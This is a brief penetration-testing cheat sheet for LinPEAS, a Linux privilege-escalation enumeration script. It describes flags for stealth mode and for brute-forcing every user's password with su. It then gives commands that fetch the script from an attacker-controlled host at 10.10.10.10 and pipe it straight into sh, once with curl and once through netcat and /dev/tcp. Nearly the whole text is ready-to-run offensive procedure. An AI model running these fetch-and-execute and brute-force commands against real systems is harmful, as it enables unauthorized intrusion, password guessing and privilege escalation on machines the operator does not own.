# Linpeas

linpeas.sh

- -a (all checks) - This will execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using su with the top2000 passwords.
- -s (superfast & stealth) - This will bypass some time consuming checks - Stealth mode (Nothing will be written to disk)
- -P (Password) - Pass a password that will be used with sudo -l and bruteforcing other users

## Local network

sudo python -m SimpleHTTPServer 8080
curl 10.10.10.10/linpeas.sh -output linpeas.sh
curl 10.10.10.10/linpeas.sh | sh

## Without curl

sudo nc -q 5 -lvnp 80 < linpeas.sh
cat < /dev/tcp/10.10.10.10/80 | sh

## Output to file

linpeas -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt #Read with colors